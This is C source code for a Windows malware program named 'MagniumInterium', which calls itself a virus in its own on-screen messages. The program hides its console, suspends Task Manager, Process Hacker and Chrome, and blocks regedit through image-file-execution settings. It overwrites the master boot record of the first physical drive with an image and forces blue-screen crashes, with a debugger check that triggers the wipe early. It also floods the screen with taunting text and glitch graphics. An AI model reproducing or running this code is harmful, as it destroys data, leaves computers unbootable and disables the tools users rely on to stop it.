#include "interium_magnium_payloads.h"
#include <time.h>
#include "magniuminterium_critproc.h"
#include "imageexec_magniuminterium.h"

HWND hw;
HDC xhc;
int width;
int height;
COLORREF rgbrain;
DWORD state;
HBRUSH brush;
RECT rekt;

void srng(DWORD dwSeed)
{
	state = dwSeed;
}
__inline DWORD rng(void)
{
	DWORD z = (state += 0x6D2B79F5UL);
	z = (z ^ (z >> 15)) * (z | 1UL);
	z ^= z + (z ^ (z >> 7)) * (z | 61UL);
	return z ^ (z >> 14);
}

void SuspendBadProcesses() 
{
	DWORD chr = FindProcessID(L"chrome.exe");
	SuspendProcessID(chr);
	DWORD task = FindProcessID(L"Taskmgr.exe");
	SuspendProcessID(task);
	DWORD prochack = FindProcessID(L"ProcessHacker.exe");
	SuspendProcessID(prochack);
}

void HideCons() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void MBROverwrite() 
{
	DWORD xza000;
	HANDLE Disk0 = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	SetFilePointer(Disk0, 0, NULL, FILE_BEGIN);
	WriteFile(Disk0, nyancat, 512, &xza000, NULL);
	CloseHandle(Disk0);
}

int main() 
{
	HideCons();
	if (IsDebuggerPresent())
	{
		MessageBoxA(GetDesktopWindow(), "Please don't try to enable Debugger...", "MagniumInterium", 0);
		MessageBoxA(GetDesktopWindow(), "Otherwise ur PC is not Enabled Anymore and not Bootable :D", "MagniumInterium", 0);
		MessageBoxA(GetDesktopWindow(), "Say Arivederci your PC :D", "MagniumInterium", 0);
		MBROverwrite();
		BSOD();
	}
	SetImageFileExecution(L"ProcessHacker.exe");
	SetImageFileExecution(L"Taskmgr.exe");
	SetImageFileExecution(L"regedit.exe");
	SuspendBadProcesses();
	CreateTempDirectory();
	CopyAboutUAndDelete();
	PlayAboutU();
	hw = GetDesktopWindow();
	xhc = GetDC(NULL);
	width = GetSystemMetrics(SM_CXSCREEN);
	height = GetSystemMetrics(SM_CYSCREEN);
	rgbrain = RGB(rng() % 111, rng() % 34, rng() % 32);
	srng(GetTickCount64());
	clock_t payload1 = clock();
	while ((clock() - payload1) / CLOCKS_PER_SEC <= 55) {
		hw = GetDesktopWindow();
		xhc = GetDC(hw);
		rekt;
		GetWindowRect(hw, &rekt);
		BitBlt(xhc, rekt.left + rng() % 4 + 4, rekt.top + rng() % 4 + 4, rekt.right + rng() % 8, rekt.bottom + rng() % 22 + 22, xhc, rekt.left, rekt.top, SRCPAINT);
		BitBlt(xhc, rekt.left + rng() % 4 + 4, rekt.top + rng() % 4 + 4, rekt.right + rng() % 8 + 8, rekt.bottom + rng() % 4 + 4, xhc, rekt.left, rekt.top, SRCINVERT);
	}
	clock_t payload2 = clock();
		while ((clock() - payload2) / CLOCKS_PER_SEC <= 70) 
		{
			hw = GetDesktopWindow();
			xhc = GetDC(NULL);
			rekt;
			GetWindowRect(hw, &rekt);
			rgbrain = RGB(rng() % 155, rng() % 155, rng() % 84);
			for (int a = 0; a < rekt.right; a += 15)
			{
				for (int b = 0; b < rekt.bottom; b += 15)
				{
					SetPixel(xhc, a, b, rgbrain);
				}
			}
			const double PI = 3.141592653589793238462643383279;
			const int xwave = 120;
			const int ywave = 155;
			for (double i = -2000; i < 2000; i += 0.01)
			{
				double j = sin(PI / xwave * i) * ywave;
				SetPixel(xhc, 200 + i, 200 + j, rgbrain);
				SetPixel(xhc, 400 + i, 400 + j, rgbrain);
				SetPixel(xhc, 12 + i, 450 + j, rgbrain);
			}
		}
		clock_t xxx = clock();
			while ((clock() - xxx) / CLOCKS_PER_SEC <= 75) 
			{
				width = GetSystemMetrics(SM_CXSCREEN);
				height = GetSystemMetrics(SM_CYSCREEN);
				hw = GetDesktopWindow();
				xhc = GetDC(NULL);
				rgbrain = RGB(rng() % 123, rng() % 44, rng() % 125);
				GetWindowRect(hw, &rekt);
				SetCursorPos(rng() % width + 6, rng() % height + 3);
				LPCWSTR msg = L"MagniumInterium is Killed ur PC :D";
				SetTextColor(xhc, rgbrain);
				TextOutW(xhc, rng() % width, rng() % height, msg, lstrlenW(msg));
				TextOutW(xhc, rng() % width, rng() % height, msg, lstrlenW(msg));
				TextOutW(xhc, rng() % width, rng() % height, msg, lstrlenW(msg));
				LineTo(xhc, rng() % (3 - height), 0);
				LineTo(xhc, rng() % (4 - width), height);
				LineTo(xhc, rng() % rekt.right, rng() % rekt.bottom);
				LineTo(xhc, rng() % rekt.right, rng() % rekt.bottom);
				Rectangle(xhc, rng() % width, rng() % height, rng() % width, rng() % height);
				RoundRect(xhc, rng() % width, rng() % height, rng() % width, rng() % height, rng() % width, rng() % height);
			}
			clock_t magn_mbr = clock();
			while ((clock() - magn_mbr) / CLOCKS_PER_SEC <= 120) {
				width = GetSystemMetrics(SM_CXSCREEN);
				height = GetSystemMetrics(SM_CYSCREEN);
				hw = GetDesktopWindow();
				xhc = GetDC(NULL);
				rgbrain = RGB(rng() % 112, rng() % 255, rng() % 185);
				GetWindowRect(hw, &rekt);
				SetTextColor(xhc, rgbrain);
				LineTo(xhc, rng() % (5 - height), 5);
				LineTo(xhc, rng() % (5 - width), height);
				LineTo(xhc, rng() % rekt.right, rng() % rekt.bottom);
				LineTo(xhc, rng() % rekt.right, rng() % rekt.bottom);
				LPCWSTR txt1 = L"MagniumInterium is totally killed ur PC :D";
				LPCWSTR txt2 = L"Don't even try to kill my Virus :D";
				TextOutW(xhc, rng() % width, rng() % height, txt1, lstrlenW(txt1));
				TextOutW(xhc, rng() % width, rng() % height, txt2, lstrlenW(txt2));
				Rectangle(xhc, rng() % width, rng() % height, rng() % width, rng() % height);
				MBROverwrite();
			}
			clock_t call_bsod = clock();
			while ((clock() - call_bsod) / CLOCKS_PER_SEC <= 10) {
				BSOD();
			}
	return 0;
}